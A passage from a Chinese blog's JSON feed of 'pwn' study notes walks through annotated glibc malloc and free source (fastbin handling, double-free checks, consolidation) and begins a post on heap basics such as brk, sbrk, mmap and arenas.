(i.e., has size &gt;=</span></span><br><span class=\"line\"><span class=\"comment\">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class=\"line\"><span class=\"comment\">         exhausted by current request, it is replenished. (The main</span></span><br><span class=\"line\"><span class=\"comment\">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class=\"line\"><span class=\"comment\">         to put in fenceposts in sysmalloc.)</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      victim = av-&gt;top;</span><br><span class=\"line\">      size = chunksize (victim);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size) &gt;= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb + MINSIZE))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          remainder_size = size - nb;</span><br><span class=\"line\">          remainder = chunk_at_offset (victim, nb);</span><br><span class=\"line\">          av-&gt;top = remainder;</span><br><span class=\"line\">          set_head (victim, nb | PREV_INUSE |</span><br><span class=\"line\">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>));</span><br><span class=\"line\">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class=\"line\"></span><br><span class=\"line\">          check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">          <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">          alloc_perturb (p, bytes);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class=\"line\"><span class=\"comment\">         here for all block sizes.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          malloc_consolidate (av);</span><br><span class=\"line\">          <span class=\"comment\">/* restore original bin index */</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (in_smallbin_range (nb))</span><br><span class=\"line\">            idx = smallbin_index (nb);</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">            idx = largebin_index (nb);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         Otherwise, relay to handle system-dependent cases</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"type\">void</span> *p = sysmalloc (nb, av);</span><br><span class=\"line\">                                                                                                                       </span><br><span class=\"line\">          <span class=\"keyword\">if</span> (p != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            alloc_perturb (p, bytes);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t在主线程下，sysmalloc () 函数的大概流程如下：</p>\n<p>​\t（1）当申请的大小 nb 大于 mp_.mmap_threshold 时，通过 mmap () 函数进行分配。其中 mp_.mmap_threshold 的默认大小为 128*1024 字节。</p>\n<p>​\t（2）尝试用 brk () 扩展堆内存，形成新的 top chunk ，而久的 top chunk 会被释放。然后从新的 top chunk 中切分出 nb 大小的 chunk ，返回给用户。</p>\n<h2 id=\"5free相关源码\"><a class=\"markdownIt-Anchor\" href=\"#5free相关源码\">#</a> 5.free () 相关源码：</h2>\n<h3 id=\"__libc_free\"><a class=\"markdownIt-Anchor\" href=\"#__libc_free\">#</a> __libc_free()：</h3>\n<p>​\t同 malloc () 函数一样，free () 函数实际上是 __libc_free ()，其定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __libc_free (<span class=\"type\">void</span> *mem)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mstate ar_ptr;</span><br><span class=\"line\">  mchunkptr p;                          <span class=\"comment\">/* chunk corresponding to mem */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">void</span> (*hook) (<span class=\"type\">void</span> *, <span class=\"type\">const</span> <span class=\"type\">void</span> *)</span><br><span class=\"line\">    = atomic_forced_read (__free_hook);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__builtin_expect (hook != <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>)) <span class=\"comment\">//hook函数不是null，就执行__free_hook对应的函数并返回</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      (*hook)(mem, RETURN_ADDRESS (<span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (mem == <span class=\"number\">0</span>)                              <span class=\"comment\">/* free(0) has no effect */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  p = mem2chunk (mem); <span class=\"comment\">//将指向user data 的指针转化为指向 chunk的指针</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (chunk_is_mmapped (p)) <span class=\"comment\">//如果chunk是mmap分配的，就用munmap_chunk（）函数释放                /* release mmapped memory. */</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class=\"line\"><span class=\"comment\">\t Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!mp_.no_dyn_threshold</span><br><span class=\"line\">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class=\"line\">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class=\"line\">\t  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          mp_.mmap_threshold = chunksize (p);</span><br><span class=\"line\">          mp_.trim_threshold = <span class=\"number\">2</span> * mp_.mmap_threshold;</span><br><span class=\"line\">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class=\"number\">2</span>,</span><br><span class=\"line\">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      munmap_chunk (p);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  MAYBE_INIT_TCACHE ();</span><br><span class=\"line\"></span><br><span class=\"line\">  ar_ptr = arena_for_chunk (p); <span class=\"comment\">//获得指向arena的指针</span></span><br><span class=\"line\">  _int_free (ar_ptr, p, <span class=\"number\">0</span>); <span class=\"comment\">//调用init函数进行释放</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"_int_free\"><a class=\"markdownIt-Anchor\" href=\"#_int_free\">#</a> _int_free()：</h3>\n<p>​\t函数开头先定义了一些列所需的变量，并获得要释放的 chunk 的大小，并对 chunk 做一些检查。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> _int_free (mstate av, mchunkptr p, <span class=\"type\">int</span> have_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  INTERNAL_SIZE_T size;        <span class=\"comment\">/* its size */</span></span><br><span class=\"line\">  mfastbinptr *fb;             <span class=\"comment\">/* associated fastbin */</span></span><br><span class=\"line\">  mchunkptr nextchunk;         <span class=\"comment\">/* next contiguous chunk */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T nextsize;    <span class=\"comment\">/* its size */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nextinuse;               <span class=\"comment\">/* true if nextchunk is used */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T prevsize;    <span class=\"comment\">/* size of previous contiguous chunk */</span></span><br><span class=\"line\">  mchunkptr bck;               <span class=\"comment\">/* misc temp for linking */</span></span><br><span class=\"line\">  mchunkptr fwd;               <span class=\"comment\">/* misc temp for linking */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  size = chunksize (p);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class=\"line\"><span class=\"comment\">     allocator never wrapps around at the end of the address space.</span></span><br><span class=\"line\"><span class=\"comment\">     Therefore we can exclude some size values which might appear</span></span><br><span class=\"line\"><span class=\"comment\">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//第一个条件筛选掉一些特别大的size，第二个条件检查chunk是否对齐</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__builtin_expect ((<span class=\"type\">uintptr_t</span>) p &gt; (<span class=\"type\">uintptr_t</span>) -size, <span class=\"number\">0</span>)</span><br><span class=\"line\">      || __builtin_expect (misaligned_chunk (p), <span class=\"number\">0</span>))</span><br><span class=\"line\">    malloc_printerr (<span class=\"string\">&quot;free(): invalid pointer&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class=\"line\"><span class=\"comment\">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class=\"line\">    <span class=\"comment\">//分别检查size是否过小以及size是否对其</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class=\"line\">    malloc_printerr (<span class=\"string\">&quot;free(): invalid size&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  check_inuse_chunk(av, p); <span class=\"comment\">//仅当定义了Malloc_Debug时使用</span></span><br></pre></td></tr></table></figure>\n<p>​\t然后，判断该 chunk 是否在 fast bin 范围内，如果是，则插入 fast bin 中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//如果size 小于global_max_fast,则将其加入fast bin中</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(size) &lt;= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(get_max_fast ())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> TRIM_FASTBINS</span></span><br><span class=\"line\">      <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tIf TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class=\"line\"><span class=\"comment\">\tbordering top into fastbins</span></span><br><span class=\"line\"><span class=\"comment\">      */</span></span><br><span class=\"line\">    <span class=\"comment\">//TRIM_FASTBINS默认为0，不会将与Top chunk靠近的fast bin删掉</span></span><br><span class=\"line\">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//检查下一个chunk的大小，不能小于2*SIZE，也不能大于av-&gt;system_mem</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class=\"line\">\t\t\t  &lt;= <span class=\"number\">2</span> * SIZE_SZ, <span class=\"number\">0</span>)</span><br><span class=\"line\">\t|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class=\"line\">\t\t\t     &gt;= av-&gt;system_mem, <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> fail = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"comment\">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class=\"line\"><span class=\"comment\">\t   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class=\"line\"><span class=\"comment\">\t   getting the lock.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!have_lock)</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    __libc_lock_lock (av-&gt;mutex);</span><br><span class=\"line\">\t    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class=\"number\">2</span> * SIZE_SZ</span><br><span class=\"line\">\t\t    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class=\"line\">\t    __libc_lock_unlock (av-&gt;mutex);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fail)</span><br><span class=\"line\">\t  malloc_printerr (<span class=\"string\">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//释放之前将user data部分填充为 perturb byte</span></span><br><span class=\"line\">    free_perturb (chunk2mem(p), size - <span class=\"number\">2</span> * SIZE_SZ);</span><br><span class=\"line\">\t<span class=\"comment\">//在av中设置位，表示fast bin中有 free chunk</span></span><br><span class=\"line\">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx = fastbin_index(size);</span><br><span class=\"line\">    fb = &amp;fastbin (av, idx);</span><br><span class=\"line\">\t<span class=\"comment\">//通过原子操作将p插入fast bin</span></span><br><span class=\"line\">    <span class=\"comment\">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class=\"line\">    mchunkptr old = *fb, old2;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (SINGLE_THREAD_P)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">\t<span class=\"comment\">/* Check that the top of the bin is not the record we are going to</span></span><br><span class=\"line\"><span class=\"comment\">\t   add (i.e., double free).  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (__builtin_expect (old == p, <span class=\"number\">0</span>)) <span class=\"comment\">//简单检查，fast bin中的第一个chunk 是不是刚刚的chunk，防止doubble free</span></span><br><span class=\"line\">\t  malloc_printerr (<span class=\"string\">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class=\"line\">\tp-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class=\"line\">\t*fb = p;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      <span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Check that the top of the bin is not the record we are going to</span></span><br><span class=\"line\"><span class=\"comment\">\t     add (i.e., double free).  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (__builtin_expect (old == p, <span class=\"number\">0</span>))</span><br><span class=\"line\">\t    malloc_printerr (<span class=\"string\">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class=\"line\">\t  old2 = old;</span><br><span class=\"line\">\t  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class=\"line\">\t     != old2);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class=\"line\"><span class=\"comment\">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class=\"line\"><span class=\"comment\">       only if we have the lock, otherwise it might have already been</span></span><br><span class=\"line\"><span class=\"comment\">       allocated again.  */</span></span><br><span class=\"line\">   <span class=\"comment\">//再次检查，fast bin</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (have_lock &amp;&amp; old != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class=\"number\">0</span>))</span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t如果该 chunk 并非 mmap () 生成的，就需要进行合并，过程如前面所讲，先向后合并，再向前合并。如果合并之后的 chunk 超过了 FASTBIN_CONSOLIDATION_THRESHOLD  ，就会整理 fast bin 并向系统返还内存。 _int_free () 函数到此结束。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class=\"line\"><span class=\"comment\">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class=\"line\"><span class=\"comment\">      threshold, ask malloc_trim to reduce top.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class=\"line\"><span class=\"comment\">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class=\"line\"><span class=\"comment\">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class=\"line\"><span class=\"comment\">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class=\"line\"><span class=\"comment\">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class=\"line\"><span class=\"comment\">      is reached.</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class=\"line\">\tmalloc_consolidate(av);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (av == &amp;main_arena) &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class=\"line\">\t    (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(mp_.trim_threshold))</span><br><span class=\"line\">\t  systrim(mp_.top_pad, av);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class=\"line\"><span class=\"comment\">\t   large, because the corresponding heap might go away.  */</span></span><br><span class=\"line\">\theap_info *heap = heap_for_ptr(top(av));</span><br><span class=\"line\"></span><br><span class=\"line\">\tassert(heap-&gt;ar_ptr == av);</span><br><span class=\"line\">\theap_trim(heap, mp_.top_pad);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!have_lock)</span><br><span class=\"line\">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    munmap_chunk (p);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/cbafa55d.html",
            "url": "http://blog.g01den.top/posts/cbafa55d.html",
            "title": "pwn学习笔记（6）--堆基础概述",
            "date_published": "2024-03-23T11:10:34.000Z",
            "content_html": "<h1 id=\"glibc堆概述\"><a class=\"markdownIt-Anchor\" href=\"#glibc堆概述\">#</a> glibc 堆概述：</h1>\n<h2 id=\"1内存管理与堆\"><a class=\"markdownIt-Anchor\" href=\"#1内存管理与堆\">#</a> 1. 内存管理与堆：</h2>\n<h3 id=\"概述\"><a class=\"markdownIt-Anchor\" href=\"#概述\">#</a> 概述：</h3>\n<p>​\t内存管理是堆计算机的内存资源进行管理，这要求在程序请求时能够动态分配内存的一部分，并在程序不需要时释放分配的内存。CTF 竞赛中常见的 ptmalloc2 就是 glibc 实现的内存管理机制，它继承了 dlmalloc，并提供了对多线程的支持。</p>\n<p>​\t堆是程序虚拟内存中由低地址向高地址增长的线性区域。一般只有当用户向操作系统申请内存时，这片区域才会被内核分配出来，并且处于效率和页对齐的考虑，通常会分配相当大的连续内存。程序再次申请时便会从这片内存中分配，直到堆空间不能满足时才会再次增长。堆的位置一般在 BSS 段高地址处。</p>\n<h3 id=\"brk和sbrk\"><a class=\"markdownIt-Anchor\" href=\"#brk和sbrk\">#</a> brk () 和 sbrk ()：</h3>\n<p>​\t堆的属性是可读可写的，大小通过 brk () 和 sbrk () 函数进行控制。在堆未初始化时，program_break 指向 BSS 段的末尾，通过调用 brk () 和 sbrk () 来移动 program_break 使得堆增长。在堆初始化时，如果开启了 ASLR，则堆的起始地址 start_brk 会在 BSS 段之后的随机位移出，如果没有开启，则 start_brk 会紧接着 BSS 段。</p>\n<p>​\t两个函数相关内容如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">brk</span><span class=\"params\">(<span class=\"type\">void</span>* end_data_segment)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">sbrk</span><span class=\"params\">(<span class=\"type\">intptr_t</span> increment)</span>;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/44bf6e33773c4e7c83318714e950a7e5.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\tbrk () 函数的参数是一个指针，用于设置 program_break 指向的位置。sbrk () 函数的参数 increment (可以是负值) 用于与 program_break 相加来调整 program_break 的值。成功执行后 brk () 函数会返回 0 ，sbrk () 函数会返回上一次 program_break 值（可以设置参数 increment 为 0 来获得当前 program_break 的值）。</p>\n<h3 id=\"mmap和unmmap\"><a class=\"markdownIt-Anchor\" href=\"#mmap和unmmap\">#</a> mmap () 和 unmmap ()：</h3>\n<p>​\t当用户申请内存过大时，ptmalloc2 会选择通过 mmap () 函数创建匿名映射段供用户使用，并通过 unmmap () 函数回收。</p>\n<h3 id=\"glibc中的堆\"><a class=\"markdownIt-Anchor\" href=\"#glibc中的堆\">#</a> glibc 中的堆：</h3>\n<p>​\t通常来说，系统中的堆指的是主线程中 main_arena 所管理的区域。但 glibc 会同时维持多个区域来供多线程使用，每个线程都有属于自己的内存（成为 arena），这些连续的内存也可以成为堆。</p>\n<p>​\tglibc 的想法是：当用户申请堆块时，从堆中按顺序分配堆块交给用户，用户保存指向这些堆块的指针；当用户释放堆块时，glibc 会将释放的堆块组织成链表；当两块相堆块都为释放状态时将之合并成一个新的堆块；由此解决内存碎片的问题。用户正在使用中的堆块叫作 allocated chunk，被释放的堆块叫做 free chunk，由 free chunk 组成的链表叫 bin。** 我们称呼当前 chunk 低地址处相邻的 chunk 